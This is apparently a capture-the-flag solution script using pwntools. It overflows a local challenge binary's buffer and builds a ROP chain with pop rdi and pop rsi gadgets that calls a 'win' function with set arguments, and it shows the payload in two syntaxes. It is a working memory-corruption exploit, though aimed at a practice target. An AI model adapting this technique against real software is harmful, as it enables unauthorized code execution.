from pwn import *

exe = ELF("../challenge/chall")
context.binary = exe

ropexe = ROP(exe)
pop_rdi = ropexe.rdi.address
pop_rsi = ropexe.rsi.address
if args.REMOTE:
    io = remote('localhost', 5000)
else:
    io = process(exe.path)
#io = gdb.debug(exe.path)
payload = 32*b"A"
payload+= 8*b'B'
payload += p32(0x1f4)
payload += p32(0x190)
payload+= 8*b"C"
payload+= p64(pop_rdi)
payload+= p64(0xdeadbeef)
payload+=p64(pop_rsi)
payload+=p64(0x1337)
payload+=8*b"R"
payload+=p64(exe.symbols['win'])

#ANother syntax-----------------

payload = flat (
    32*b'A',
    8*b'B'
)
payload += p32(0x1f4) + p32(0x190) #cuz its ints
payload += flat(
    8*b'C',
    pop_rdi,
    0xdeadbeef,
    pop_rsi,
    0x1337,
    8*b'D',
    exe.symbols['win']
)
#------------------------------------------------------

io.recv()
io.sendline(payload)
io.interactive()



